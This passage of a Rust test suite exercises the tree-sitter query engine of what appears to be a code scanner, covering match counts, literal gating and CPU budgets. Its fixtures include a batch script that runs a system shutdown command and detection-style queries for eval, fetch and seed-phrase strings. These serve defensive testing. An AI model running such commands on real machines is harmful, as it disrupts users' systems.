    let single = eval_ast(None, None, None, None, None, Some(selected), false, &ctx);
    assert_eq!(single.match_count, 2);
    assert_eq!(single.evidence.len(), 2);
    assert_eq!(single.evidence[0].value, "emit(123)");
    assert_eq!(single.evidence[0].offsets, vec![0]);
    assert_eq!(single.evidence[1].value, "other(456)");
    assert_eq!(single.evidence[1].offsets, vec![10]);
    let tree = parsed.source_ast().unwrap().tree;
    let grouped = super::ast::batch_ast_queries(
        tree,
        source,
        FileType::Python,
        &[selected, legacy],
        None,
        None,
    )
    .unwrap();
    assert_eq!(grouped[selected].match_count, 2);
    assert_eq!(grouped[selected].evidence.len(), 2);
    assert_eq!(grouped[selected].evidence[0].offsets, vec![0]);
    assert_eq!(grouped[selected].evidence[1].offsets, vec![10]);
    assert_eq!(grouped[legacy].match_count, 2);
    assert_eq!(grouped[legacy].evidence.len(), 6);
}

#[test]
fn ast_query_evidence_capture_requires_the_selected_site_to_be_bound() {
    let selected = "(call function: (identifier) @callee) @evidence\n(identifier) @support";
    let sibling = "(identifier) @identifier";
    let _count = super::symbol_string::MatchCountGuard::set(true);
    for (source, expected) in [("value = 1\n", 0), ("emit(1)\n", 1)] {
        let report = create_test_report("/test/optional-site.py");
        let parsed = parsed_for_test("optional-site.py", source.as_bytes());
        let ctx =
            create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
        let single = eval_ast(None, None, None, None, None, Some(selected), false, &ctx);
        assert_eq!(single.match_count, expected);
        assert_eq!(single.matched, expected > 0);
        assert_eq!(single.evidence.len(), expected);
        let tree = parsed.source_ast().unwrap().tree;
        let grouped = super::ast::batch_ast_queries(
            tree,
            source,
            FileType::Python,
            &[selected, sibling],
            None,
            None,
        )
        .unwrap();
        assert_eq!(grouped[selected].match_count, expected);
        assert_eq!(grouped[selected].evidence.len(), expected);
        assert!(
            grouped[sibling].matched,
            "a sibling keeps its ordinary captures"
        );
    }
}

#[test]
fn ast_query_counts_occurrences_not_captures_in_single_and_batch_paths() {
    let query = "(call function: (identifier) @callee arguments: (argument_list) @args) @call";
    let sibling = "(identifier) @id";
    let _count = super::symbol_string::MatchCountGuard::set(true);
    for count in [1, 2, 3] {
        let source = "emit(123)\n".repeat(count);
        let report = create_test_report("/test/count.py");
        let parsed = parsed_for_test("count.py", source.as_bytes());
        let ctx =
            create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
        let single = eval_ast(None, None, None, None, None, Some(query), false, &ctx);
        assert_eq!(
            single.match_count, count,
            "single query with three captures"
        );
        assert!(single.evidence.len() >= 3);
        let tree = parsed.source_ast().unwrap().tree;
        let grouped = super::ast::batch_ast_queries(
            tree,
            &source,
            FileType::Python,
            &[query, sibling],
            None,
            None,
        )
        .unwrap();
        assert_eq!(
            grouped[query].match_count, count,
            "grouped query with three captures"
        );
        assert!(grouped[query].evidence.len() >= 3);
    }
}

#[test]
fn ast_query_empty_capture_matches_are_not_source_occurrences() {
    let query = "(call function: (identifier) @callee) (#eq? @callee \"emit\")";
    let no_capture = "(identifier)";
    let sibling = "(identifier) @id";
    let _count = super::symbol_string::MatchCountGuard::set(true);
    for source in ["value = 1", "emit(1)\n"] {
        let report = create_test_report("/test/empty.py");
        let parsed = parsed_for_test("empty.py", source.as_bytes());
        let ctx =
            create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);
        let expected = usize::from(source.starts_with("emit"));
        let single = eval_ast(None, None, None, None, None, Some(query), false, &ctx);
        assert_eq!(single.match_count, expected);
        let empty = eval_ast(None, None, None, None, None, Some(no_capture), false, &ctx);
        assert!(!empty.matched);
        let tree = parsed.source_ast().unwrap().tree;
        let grouped = super::ast::batch_ast_queries(
            tree,
            source,
            FileType::Python,
            &[query, no_capture, sibling],
            None,
            None,
        )
        .unwrap();
        assert_eq!(grouped[query].match_count, expected);
        assert!(!grouped[no_capture].matched);
    }
}

#[test]
fn ast_query_legacy_batch_bytes_use_filefacts_source_view_and_offsets() {
    let source = b"@echo off\r\nrem \x96\x7b\x93\x96\r\nshutdown -s -t 300\r\npause > NUL\r\n";
    let parsed = parsed_for_test("legacy.bat", source);
    let ast = parsed.source_ast().unwrap();
    assert_eq!(filefacts::source_text_for_ast(source), ast.source);
    assert_eq!(ast.source.len(), source.len());
    let report = create_test_report("/test/legacy.bat");
    let ctx = create_test_context_with_ast(&report, &parsed, source, FileType::Batch);
    let query = "(cmd (command_name) @tool (#eq? @tool \"shutdown\"))";
    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);
    assert!(result.matched);
    assert_eq!(result.match_count, 1);
    let offset = source.windows(8).position(|b| b == b"shutdown").unwrap() as u64;
    assert!(
        result
            .evidence
            .iter()
            .any(|e| e.value == "shutdown" && e.offsets == [offset])
    );
    let grouped = super::ast::batch_ast_queries(
        ast.tree,
        &filefacts::source_text_for_ast(source),
        FileType::Batch,
        &[query, "(cmd (command_name) @tool (#eq? @tool \"pause\"))"],
        None,
        None,
    )
    .unwrap();
    assert_eq!(grouped[query].match_count, 1);
    assert_eq!(grouped[query].evidence[0].offsets, vec![offset]);
    let simple = eval_ast(
        None,
        Some("command_name"),
        None,
        Some("shutdown"),
        None,
        None,
        false,
        &ctx,
    );
    assert!(simple.matched);
}

/// The literals a JavaScript `query` requires, and whether `text` holds them.
fn js_query_admits(query: &str, text: &str) -> bool {
    let parsed = parsed_for_test("gate.js", b"x;");
    let tree = parsed.source_ast().expect("JavaScript parses").tree;
    let compiled = tree_sitter::Query::new(&tree.language(), query).expect("query compiles");
    super::ast_gate::RequiredLiterals::of(&compiled, query)
        .may_match(|literal| memchr::memmem::find(text.as_bytes(), literal).is_some())
}

#[test]
fn ast_gate_requires_eq_and_match_literals_of_bound_captures() {
    let eq = r#"((call_expression function: (identifier) @f) (#eq? @f "eval"))"#;
    assert!(js_query_admits(eq, "eval(code)"));
    assert!(!js_query_admits(eq, "run(code)"));

    let regex = r#"((string) @s (#match? @s "Invalid seed phrase"))"#;
    assert!(js_query_admits(regex, r#"throw "Invalid seed phrase!""#));
    assert!(!js_query_admits(regex, "throw 'invalid'"));

    // The query source escapes `(`; tree-sitter unescapes it to the regex
    // `fetch\(`, whose literal is `fetch(`.
    let escaped = r#"((statement_block) @b (#match? @b "fetch\\(url"))"#;
    assert!(js_query_admits(escaped, "{ fetch(url) }"));
    assert!(!js_query_admits(escaped, "{ fetch url }"));
}

#[test]
fn ast_gate_never_requires_what_a_match_may_lack() {
    for query in [
        // Optional capture: an unbound capture passes its predicate.
        r#"((call_expression function: (identifier)? @f) @c (#eq? @f "eval"))"#,
        // Bound in only one alternative.
        r#"([(identifier) @f (number) @n] (#eq? @f "eval"))"#,
        // Negated and any- forms assert nothing present.
        r#"((identifier) @f (#not-eq? @f "eval"))"#,
        r#"((identifier) @f (#any-eq? @f "eval"))"#,
        r#"((identifier) @f (#not-match? @f "eval"))"#,
        // No case-sensitive literal, or one too short to extract.
        r#"((identifier) @f (#match? @f "(?i)eval"))"#,
        r#"((identifier) @f (#match? @f "^ev"))"#,
        // A capture-to-capture comparison names no literal.
        r#"((call_expression function: (identifier) @f arguments: (arguments (identifier) @a)) (#eq? @f @a))"#,
        // Commented out: not a predicate tree-sitter applies.
        "((identifier) @f\n ; (#eq? @f \"eval\")\n)",
    ] {
        assert!(js_query_admits(query, ""), "must not gate: {query}");
    }
}

#[test]
fn ast_gate_admits_when_any_pattern_could_match() {
    let query = r#"
        ((identifier) @a (#eq? @a "alpha"))
        ((identifier) @b (#eq? @b "beta"))
    "#;
    assert!(js_query_admits(query, "beta;"));
    assert!(!js_query_admits(query, "gamma;"));
}

/// A regex whose alternatives share only part of a multi-byte character
/// (`é` = C3 A9, `ê` = C3 AA) requires the whole characters before it, never
/// a U+FFFD stand-in: that would gate out every file the query matches.
#[test]
fn ast_gate_literal_never_splits_a_utf8_character() {
    let query = r#"((string) @s (#match? @s "café[éê]"))"#;
    assert!(js_query_admits(query, r#"x = "caféé";"#));
    assert!(js_query_admits(query, r#"x = "caféê";"#));
    assert!(!js_query_admits(query, r#"x = "tea";"#));
}

/// Enough statements that any walk outlasts a zero CPU budget.
fn walk_heavy_source() -> String {
    let mut source = String::new();
    for i in 0..2000 {
        source.push_str(&format!("call_{i}(arg_{i});\n"));
    }
    source.push_str("present_name(last);\n");
    source
}

/// Regression guard for the literal gate: a query whose literal the file lacks
/// must be answered without walking the tree. Under a zero CPU budget any walk
/// records a timeout, so the gated query's clean result proves it never ran —
/// and the control proves this source does make a walk time out. Before the
/// gate, unmatchable queries like this ran to the full CPU budget, several per
/// minified bundle.
#[test]
fn ast_gate_skips_the_walk_when_a_required_literal_is_absent() {
    let source = walk_heavy_source();
    let report = create_test_report("bundle.js");
    let parsed = parsed_for_test("bundle.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);
    let timed_out = |r: &ConditionResult| {
        r.warnings
            .iter()
            .any(|w| matches!(w, AnalysisWarning::AstTooDeep { max_depth: 0 }))
    };

    let absent = r#"((call_expression function: (identifier) @f) (#eq? @f "absent_name"))"#;
    let gated = super::ast::eval_ast_query_with_budget(absent, &ctx, std::time::Duration::ZERO);
    assert!(!gated.matched);
    assert!(
        !timed_out(&gated),
        "gated query walked: {:?}",
        gated.warnings
    );

    let present = r#"((call_expression function: (identifier) @f) (#eq? @f "present_name"))"#;
    let walked = super::ast::eval_ast_query_with_budget(present, &ctx, std::time::Duration::ZERO);
    assert!(timed_out(&walked), "control must walk and time out");
}

/// The batched path gates too: queries the file cannot satisfy are answered
/// without joining (and possibly timing out) the shared walk.
#[test]
fn ast_gate_answers_batched_queries_without_a_walk() {
    let source = walk_heavy_source();
    let parsed = parsed_for_test("bundle.js", source.as_bytes());
    let tree = parsed.source_ast().expect("JavaScript parses").tree;
    let absent_a = r#"((call_expression function: (identifier) @f) (#eq? @f "absent_a"))"#;
    let absent_b = r#"((identifier) @i (#match? @i "absent_b"))"#;

    let batch = super::ast::batch_ast_queries_with_budget(
        tree,
        &source,
        FileType::JavaScript,
        &[absent_a, absent_b],
        None,
        None,
        Some(std::time::Duration::ZERO),
    )
    .expect("gated queries are answered, not timed out");
    for query in [absent_a, absent_b] {
        let result = &batch[query];
        assert!(
            !result.matched && result.warnings.is_empty(),
            "{query}: {result:?}"
        );
    }
}

/// Regression guard for the per-query CPU ceiling. At 30 s, unanchored
/// sibling queries ran to the ceiling one after another on minified bundles
/// (~80-107 s per member of one VS Code extension) without matching; 5 s kept
/// that extension's findings identical. Raise it only with a measured reason.
#[test]
fn ast_query_cpu_budget_stays_tight() {
    assert!(
        crate::analyzers::ast_walker::AST_QUERY_CPU_BUDGET <= std::time::Duration::from_secs(5)
    );
}

#[test]
fn ast_node_gate_only_rejects_impossible_capture_predicates() {
    let source = r#"// http.request('not an identifier')
        const alias = require('http'); alias.request('body');
        let alpha = 1; beta(alpha); const empty = '';
    "#;
    let parsed = parsed_for_test("gate.js", source.as_bytes());
    let tree = parsed.source_ast().unwrap().tree;
    let index = super::ast_gate::NodeTextIndex::new(tree, source);
    let admits = |q: &str| {
        let compiled = tree_sitter::Query::new(&tree.language(), q).unwrap();
        super::ast_gate::RequiredNodes::of(&tree.language(), &compiled, q).may_match(&index)
    };
    assert!(!admits(r#"((identifier) @x (#eq? @x "http"))"#));
    assert!(!admits(r#"((identifier) @x (#match? @x "^https?$"))"#));
    assert!(admits(r#"((string_fragment) @x (#eq? @x "http"))"#));
    assert!(admits(r#"((property_identifier) @x (#eq? @x "request"))"#));
    assert!(admits(r#"((identifier) @x (#match? @x "(?i)^ALPHA$"))"#));
    assert!(admits(r#"((identifier) @x (#not-eq? @x "missing"))"#));
    assert!(admits(
        r#"([(identifier) @x (string_fragment) @x] (#eq? @x "http"))"#
    ));
    assert!(admits(
        r#"([(identifier) @x (number)] (#eq? @x "missing"))"#
    ));
    assert!(admits(
        r#"((call_expression arguments: (arguments (identifier)? @x)) (#eq? @x "missing"))"#
    ));
    assert!(admits(
        r#"((identifier) @x (#eq? @x "missing")) ((identifier) @x (#eq? @x "alpha"))"#
    ));
    assert!(admits("((identifier) @x ; (#eq? @x \"missing\")\n)"));
    assert!(!admits(r#"((identifier) @x @y (#eq? @y "http"))"#));
}

#[test]
fn ast_node_gate_checks_required_kinds_without_rejecting_optional_or_supertype_nodes() {
    let source = "// import_statement debugger_statement\nconst x = 1; run(x);";
    let parsed = parsed_for_test("gate.js", source.as_bytes());
    let tree = parsed.source_ast().unwrap().tree;
    let index = super::ast_gate::NodeTextIndex::new(tree, source);
    let admits = |q: &str| {
        let compiled = tree_sitter::Query::new(&tree.language(), q).unwrap();
        super::ast_gate::RequiredNodes::of(&tree.language(), &compiled, q).may_match(&index)
    };
    assert!(!admits("(import_statement) @import"));
    assert!(!admits("(call_expression function: (import)) @call"));
    assert!(!admits("(program (debugger_statement)) @program"));
    assert!(admits(
        "(program (expression_statement (call_expression function: (import)))?) @program"
    ));
    assert!(admits(
        "(program [(import_statement) (lexical_declaration)]) @program"
    ));
    assert!(admits(
        "(program (import_statement)* (lexical_declaration)) @program"
    ));
    assert!(!admits("(debugger_statement) @debugger"));
    assert!(admits("(call_expression function: (identifier) @fn) @call"));
    assert!(admits("(expression) @expression"));
    assert!(admits("[(import_statement) @node (identifier) @node]"));
    assert!(admits("(program (import_statement)? @import) @program"));
    assert!(admits("(import_statement) @import (identifier) @id"));
}

#[test]
fn ast_missing_kinds_are_answered_before_the_query_cpu_budget() {
    let source = "// debugger_statement import_statement\nconst x = 1;";
    let parsed = parsed_for_test("gate.js", source.as_bytes());
    let tree = parsed.source_ast().unwrap().tree;
    let queries = [
        "(import_statement) @import",
        "(debugger_statement) @debugger",
    ];
    let answers = super::ast::batch_ast_queries_with_budget(
        tree,
        source,
        FileType::JavaScript,
        &queries,
        None,
        None,
        Some(std::time::Duration::ZERO),
    )
    .unwrap();
    for query in queries {
        assert!(!answers[query].matched);
        assert!(answers[query].warnings.is_empty());
    }
}

#[test]
fn batch_ast_wide_sibling_overflow_does_not_starve_later_patterns() {
    let source = format!(
        "const table = [{}]; eval('late');",
        vec!["'x'"; 512].join(",")
    );
    let parsed = parsed_for_test("wide.js", source.as_bytes());
    let tree = parsed.source_ast().unwrap().tree;
    let wide = "(array (string) @a (string) @b (string) @c) @array";
    let late = "((call_expression function: (identifier) @f) (#eq? @f \"eval\")) @call";
    let batch = batch_ast_queries(
        tree,
        &source,
        FileType::JavaScript,
        &[wide, late],
        None,
        None,
    )
    .unwrap();
    assert!(
        !batch.contains_key(wide),
        "limited pattern must be evaluated independently"
    );
    assert_eq!(batch[late].match_count, 1);
    assert!(batch[late].warnings.is_empty());
}

#[test]
fn cursor_pattern_stop_preserves_other_patterns_and_resets_on_reuse() {
    use streaming_iterator::StreamingIterator;
    let source = format!("const x = [{}]; later();", vec!["'x'"; 20].join(","));
    let parsed = parsed_for_test("stop.js", source.as_bytes());
    let tree = parsed.source_ast().unwrap().tree;
    let query = tree_sitter::Query::new(
        &tree.language(),
        "(array (string) @a (string) @b) @array\n(identifier) @id",
    )
    .unwrap();
    let mut cursor = tree_sitter::QueryCursor::new();
    let mut counts = [0; 2];
    let mut matches = cursor.matches(&query, tree.root_node(), source.as_bytes());
    while let Some(m) = matches.next() {
        let pattern = m.pattern_index;
        counts[pattern] += 1;
        if pattern == 0 {
            matches.disable_pattern(pattern);
        }
    }
    assert_eq!(counts, [1, 2]);
    // This only changes the executing cursor, not the shared compiled query.
    let count_all = |cursor: &mut tree_sitter::QueryCursor| {
        let mut counts = [0; 2];
        let mut matches = cursor.matches(&query, tree.root_node(), source.as_bytes());
        while let Some(m) = matches.next() {
            counts[m.pattern_index] += 1;
        }
        counts
    };
    let independent = count_all(&mut tree_sitter::QueryCursor::new());
    assert!(independent[0] > 1);
    assert_eq!(count_all(&mut cursor), independent);
}

#[test]
fn ast_node_gate_avoids_broad_sibling_walk_with_misleading_raw_text() {
    let source = format!("// http request write end\n{}", walk_heavy_source());
    let parsed = parsed_for_test("gate.js", source.as_bytes());
    let tree = parsed.source_ast().unwrap().tree;
    let query = r#"((program (expression_statement (call_expression function: (identifier) @a))
        (expression_statement (call_expression function: (identifier) @b)))
        (#eq? @a "http") (#eq? @b "write"))"#;
    let other = r#"((identifier) @x (#eq? @x "absent"))"#;
    let result = super::ast::batch_ast_queries_with_budget(
        tree,
        &source,
        FileType::JavaScript,
        &[query, other],
        None,
        None,
        Some(std::time::Duration::ZERO),
    )
    .unwrap();
    assert!(!result[query].matched);
    assert!(
        result[query].warnings.is_empty(),
        "no query ran to its CPU limit"
    );
}

#[test]
fn ast_node_gate_checks_complete_object_keys() {
    let source = r#"const a = {header: 'Origin', ['operation']: 'set'};
        const words = ['operation', 'absent']; // operation absent
    "#;
    let parsed = parsed_for_test("gate.js", source.as_bytes());
    let tree = parsed.source_ast().unwrap().tree;
    let index = super::ast_gate::NodeTextIndex::new(tree, source);
    let admits = |q: &str| {
        let compiled = tree_sitter::Query::new(&tree.language(), q).unwrap();
        super::ast_gate::RequiredNodes::of(&tree.language(), &compiled, q).may_match(&index)
    };
    assert!(!admits(r#"((pair key: (_) @key) (#eq? @key "operation"))"#));
    assert!(!admits(
        r#"((pair key: (_) @key) (#match? @key "^['\"]?absent['\"]?$"))"#
    ));
    assert!(admits(r#"((pair key: (_) @key) (#eq? @key "header"))"#));
    assert!(admits(
        r#"((pair key: (_) @key) (#eq? @key "['operation']"))"#
    ));
    // An alternative capture outside a key must discard the key restriction.
    assert!(admits(
        r#"([(pair key: (_) @key) (string_fragment) @key] (#eq? @key "operation"))"#
    ));
    assert!(admits(
        r#"((pair key: (_) @key value: (string) @value) (#eq? @value "'Origin'"))"#
    ));
}

/// Compare complete capture sequences, including order, against the unfiltered
/// native matcher. Predicate pruning must preserve optional/repeated captures,
/// anchors, alternatives, negative/any predicates, and capture comparisons.
#[test]
fn ast_early_predicates_preserve_structural_match_semantics() {
    use streaming_iterator::StreamingIterator;
    let parsed = parsed_for_test("predicates.js", b"a;");
    let lang = parsed.source_ast().unwrap().tree.language();
    let mut parser = tree_sitter::Parser::new();
    parser.set_language(&lang).unwrap();
    let patterns = [
        "(identifier) @x",
        "(identifier) @x @y",
        "(program (expression_statement (identifier) @x)) @root",
        "(program (expression_statement (identifier) @x) (expression_statement (identifier) @y)) @root",
        "(program . (expression_statement (identifier) @x) (expression_statement)* .) @root",
        "(program (expression_statement)* (expression_statement (identifier) @x) .) @root",
        "(program (expression_statement (identifier) @x)+) @root",
        "(program (expression_statement (identifier) @x)*) @root",
        "(program (expression_statement (identifier) @x)? (expression_statement (identifier) @y)) @root",
        "(program (expression_statement (identifier) @x) (expression_statement (identifier) @x)) @root",
        "(program [(expression_statement (identifier) @x) (expression_statement (number))]+) @root",
        "(_ (expression_statement (identifier) @x) (expression_statement (identifier) @y)) @root",
        "(program (expression_statement (identifier) @x) . (expression_statement (identifier) @y)) @root",
        "(program (expression_statement (identifier) @x) (expression_statement (identifier) @y)*) @root",
    ];
    let predicates = [
        "(#eq? @x \"a\")",
        "(#not-eq? @x \"a\")",
        "(#match? @x \"^[ab]$\")",
        "(#not-match? @x \"^b$\")",
        "(#any-eq? @x \"a\")",
        "(#any-not-eq? @x \"a\")",
        "(#any-match? @x \"^a$\")",
        "(#any-not-match? @x \"^a$\")",
        "(#any-of? @x \"a\" \"b\")",
        "(#not-any-of? @x \"b\" \"c\")",
    ];
    let mut queries = Vec::new();
    for pattern in patterns {
        for predicate in predicates {
            let text = format!("({pattern} {predicate})");
            queries.push((tree_sitter::Query::new(&lang, &text).unwrap(), text));
        }
        if pattern.contains("@y") {
            for predicate in ["#eq?", "#not-eq?", "#any-eq?", "#any-not-eq?"] {
                for pair in ["@x @y", "@y @x"] {
                    let text = format!("({pattern} ({predicate} {pair}))");
                    queries.push((tree_sitter::Query::new(&lang, &text).unwrap(), text));
                }
            }
        }
    }
    for len in 0..=5u32 {
        for mut code in 0..3usize.pow(len) {
            let mut src = String::new();
            for _ in 0..len {
                src.push_str(["a;", "b;", "c;"][code % 3]);
                code /= 3;
            }
            let tree = parser.parse(&src, None).unwrap();
            for (query, text) in &queries {
                let collect = |early: bool| {
                    let mut cursor = tree_sitter::QueryCursor::new();
                    cursor.set_match_limit(65536);
                    let mut filter =
                        |pattern,
                         capture,
                         node: tree_sitter::Node<'_>,
                         previous: &[tree_sitter::QueryCapture<'_>]| {
                            query.capture_satisfies_match_predicates(
                                pattern,
                                capture,
                                node,
                                previous,
                                src.as_bytes(),
                            )
                        };
                    let options = if early {
                        tree_sitter::QueryCursorOptions::new().capture_match_predicate(&mut filter)
                    } else {
                        tree_sitter::QueryCursorOptions::new()
                    };
                    let mut matches = cursor.matches_with_options(
                        query,
                        tree.root_node(),
                        src.as_bytes(),
                        options,
                    );
                    let mut found = Vec::new();
                    while let Some(m) = matches.next() {
                        found.push((
                            m.pattern_index,
                            m.captures()
                                .iter()
                                .map(|c| (c.index, c.node.byte_range()))
                                .collect::<Vec<_>>(),
                        ));
                    }
                    found
                };
                let expected = collect(false);
                assert_eq!(collect(true), expected, "{text} on {src:?}");
            }
        }
    }
}

#[test]
fn ast_batch_reuses_compilation_across_literal_subsets() {
    let queries = [
        r#"((identifier) @bank_alpha (#eq? @bank_alpha "alpha"))"#,
        r#"((identifier) @bank_beta (#eq? @bank_beta "beta"))"#,
        r#"((identifier) @bank_common (#eq? @bank_common "common"))"#,
    ];
    for (source, expected) in [
        ("alpha; common;", [true, false, true]),
        ("beta; common;", [false, true, true]),
    ] {
        let parsed = parsed_for_test("bank.js", source.as_bytes());
        let tree = parsed.source_ast().unwrap().tree;
        let results = super::ast::batch_ast_queries_with_budget(
            tree,
            source,
            FileType::JavaScript,
            &queries,
            None,
            None,
            None,
        )
        .unwrap();
        for (query, matched) in queries.iter().zip(expected) {
            assert_eq!(results[*query].matched, matched, "{source}: {query}");
        }
        assert!(super::ast::combined_bank_cached_for_test(
            &tree.language(),
            FileType::JavaScript,
            &queries
        ));
    }
}

/// Repeated patterns reuse the same grammar positions while their query steps
/// and field constraints differ. Compiler transition caching must preserve the
/// complete captures for every pattern and errors for invalid structure.
#[test]
fn ast_compiler_preserves_repeated_patterns_with_fields_and_alternatives() {
    let source = "send(input); api.read(input); store.write(42); left + right; left + 7;";
    let parsed = parsed_for_test("compiler-cache.js", source.as_bytes());
    let tree = parsed.source_ast().unwrap().tree;
    let patterns = [
        "(call_expression function: (identifier) @function arguments: (arguments (identifier) @argument))",
        "(call_expression function: (member_expression object: (identifier) @object property: (property_identifier) @property) arguments: (arguments [(identifier) (number)] @argument))",
        "(binary_expression left: (identifier) @left right: [(identifier) (number)] @right)",
    ];
    let expected = [
        vec![vec![("function", "send"), ("argument", "input")]],
        vec![
            vec![
                ("object", "api"),
                ("property", "read"),
                ("argument", "input"),
            ],
            vec![
                ("object", "store"),
                ("property", "write"),
                ("argument", "42"),
            ],
        ],
        vec![
            vec![("left", "left"), ("right", "right")],
            vec![("left", "left"), ("right", "7")],
        ],
    ];
    let query_source = patterns.repeat(32).join("\n");
    let query = tree_sitter::Query::new(&tree.language(), &query_source).unwrap();
    let mut cursor = tree_sitter::QueryCursor::new();
    let mut results = vec![Vec::new(); 96];
    {
        use streaming_iterator::StreamingIterator;
        let mut matches = cursor.matches(&query, tree.root_node(), source.as_bytes());
        while let Some(m) = matches.next() {
            let captures: Vec<_> = m
                .captures()
                .iter()
                .map(|c| {
                    (
                        query.capture_names()[c.index as usize],
                        c.node.utf8_text(source.as_bytes()).unwrap(),
                    )
                })
                .collect();
            results[m.pattern_index].push(captures);
        }
    }
    assert!(!cursor.did_exceed_match_limit());
    for (i, matches) in results.iter().enumerate() {
        assert_eq!(matches, &expected[i % 3], "pattern {i}");
    }
    // Invalid structure must retain the same error location even when valid
    // repeated patterns have already populated the compiler's local cache.
    let invalid = "(identifier (identifier))";
    let prefix = format!("{query_source}\n");
    let single = tree_sitter::Query::new(&tree.language(), invalid).unwrap_err();
    let combined =
        tree_sitter::Query::new(&tree.language(), &(prefix.clone() + invalid)).unwrap_err();
    assert_eq!(combined.kind, single.kind);
    assert_eq!(combined.offset, prefix.len() + single.offset);
}

#[test]
fn batch_boolean_queries_stop_all_patterns_but_count_queries_finish() {
    let source = "alpha; beta; alpha; beta; 1; 2; 3; 4;";
    let parsed = parsed_for_test("boolean.js", source.as_bytes());
    let tree = parsed.source_ast().unwrap().tree;
    let boolean = "(identifier) @id\n(expression_statement (identifier) @other)";
    let counting = "(number) @number";
    let boolean_queries = [boolean.to_owned()].into_iter().collect();
    let results = super::ast::batch_ast_queries_with_index(
        tree,
        source,
        FileType::JavaScript,
        &[boolean, counting],
        None,
        None,
        None,
        None,
        Some(&boolean_queries),
    )
    .unwrap();
    assert_eq!(results[boolean].match_count, 1);
    assert_eq!(results[counting].match_count, 4);
    assert_eq!(results[counting].evidence.len(), 4);
    // The same compiled bank must remain usable for a subsequent full-count walk.
    let complete = super::ast::batch_ast_queries(
        tree,
        source,
        FileType::JavaScript,
        &[boolean, counting],
        None,
        None,
    )
    .unwrap();
    assert_eq!(complete[boolean].match_count, 8);
    assert_eq!(complete[counting].match_count, 4);
}

#[test]
fn standalone_ast_query_uses_complete_node_index_for_negative_gates() {
    let source = b"const message = 'eval';";
    let parsed = parsed_for_test("standalone-gate.js", source);
    let tree = parsed.source_ast().unwrap().tree;
    let report = create_test_report("standalone-gate.js");
    let index = super::ast_gate::NodeTextIndex::new(tree, std::str::from_utf8(source).unwrap());
    let mut ctx = create_test_context_with_ast(&report, &parsed, source, FileType::JavaScript);
    ctx.ast_node_text = Some(&index);
    let query = r#"((identifier) @name (#eq? @name "eval"))"#;
    let result = super::ast::eval_ast_query_with_budget(query, &ctx, std::time::Duration::ZERO);
    assert!(!result.matched);
    assert!(
        result.warnings.is_empty(),
        "the gate should prove absence before timeout"
    );
    let present = r#"((identifier) @name (#eq? @name "message"))"#;
    assert!(super::ast::eval_ast_query(present, &ctx).matched);
}

#[test]
fn batch_gates_each_pattern_without_changing_the_shared_query_results() {
    let source = "alpha; 1; alpha; 2;";
    let parsed = parsed_for_test("pattern-gates.js", source.as_bytes());
    let tree = parsed.source_ast().unwrap().tree;
    let mixed = r#"((identifier) @id (#eq? @id "alpha"))
        ((program (expression_statement)* @statement) @root (#eq? @root "absent"))"#;
    let number = "(number) @number";
    let results = super::ast::batch_ast_queries(
        tree,
        source,
        FileType::JavaScript,
        &[mixed, number],
        None,
        None,
    )
    .unwrap();
    assert_eq!(results[mixed].match_count, 2);
    assert_eq!(results[number].match_count, 2);
    // Gating is private to this cursor: a later file can match the formerly
    // impossible alternative using the same compiled bank.
    let other = "absent";
    let parsed = parsed_for_test("pattern-gates.js", other.as_bytes());
    let report = create_test_report("pattern-gates.js");
    let ctx =
        create_test_context_with_ast(&report, &parsed, other.as_bytes(), FileType::JavaScript);
    assert!(super::ast::eval_ast_query(mixed, &ctx).matched);
}

#[test]
fn ast_cross_capture_pruning_preserves_capture_iteration_and_cursor_reuse() {
    use streaming_iterator::StreamingIterator;
    let source = b"a; b; a; c; b;";
    let parsed = parsed_for_test("capture-pairs.js", source);
    let tree = parsed.source_ast().unwrap().tree;
    let query = tree_sitter::Query::new(&tree.language(),
        "((program (expression_statement (identifier) @a) (expression_statement (identifier) @b)) (#eq? @a @b))").unwrap();
    let collect = |cursor: &mut tree_sitter::QueryCursor, early: bool, rejected: &mut usize| {
        let mut filter = |pattern,
                          capture,
                          node: tree_sitter::Node<'_>,
                          previous: &[tree_sitter::QueryCapture<'_>]| {
            let accepts =
                query.capture_satisfies_match_predicates(pattern, capture, node, previous, source);
            *rejected += usize::from(!accepts);
            accepts
        };
        let options = if early {
            tree_sitter::QueryCursorOptions::new().capture_match_predicate(&mut filter)
        } else {
            tree_sitter::QueryCursorOptions::new()
        };
        let mut captures =
            cursor.captures_with_options(&query, tree.root_node(), source.as_slice(), options);
        let mut found = Vec::new();
        while let Some((m, i)) = captures.next() {
            let capture = m.captures()[*i];
            found.push((m.pattern_index, capture.index, capture.node.byte_range()));
        }
        found
    };
    let mut cursor = tree_sitter::QueryCursor::new();
    let mut rejected = 0;
    let expected = collect(&mut cursor, false, &mut rejected);
    assert!(!expected.is_empty());
    assert_eq!(collect(&mut cursor, true, &mut rejected), expected);
    assert!(
        rejected > 0,
        "mismatched names must be pruned before complete matches"
    );
    // The previous callback has been dropped. A fresh execution must clear it.
    assert_eq!(collect(&mut cursor, false, &mut rejected), expected);
}

#[test]
fn ast_batch_stops_limited_patterns_and_reenables_them_on_cursor_reuse() {
    use streaming_iterator::StreamingIterator;
    let source = format!("const table = [{}]; done();", vec!["'x'"; 512].join(","));
    let parsed = parsed_for_test("limited.js", source.as_bytes());
    let tree = parsed.source_ast().unwrap().tree;
    let query = tree_sitter::Query::new(&tree.language(),
        "(array (string) @a (string) @b (string) @c) @array\n(call_expression function: (identifier) @done)\n(program (lexical_declaration (variable_declarator name: (identifier) @first)) (expression_statement (call_expression function: (identifier) @last)))").unwrap();
    let run = |cursor: &mut tree_sitter::QueryCursor, stop: bool, group_cap: bool| {
        cursor.set_match_limit(if group_cap { 65536 } else { 2 });
        cursor.set_max_states_per_group(if group_cap { 16 } else { 16384 });
        cursor.set_stop_on_pattern_limit(stop);
        let mut calls = 0;
        let mut filter = |pattern: usize, _: u32, _: tree_sitter::Node<'_>| {
            calls += usize::from(pattern == 0);
            true
        };
        let mut matches = cursor.matches_with_options(
            &query,
            tree.root_node(),
            source.as_bytes(),
            tree_sitter::QueryCursorOptions::new().capture_predicate(&mut filter),
        );
        let mut counts = [0; 3];
        while let Some(m) = matches.next() {
            counts[m.pattern_index] += 1;
        }
        drop(matches);
        (counts, calls)
    };
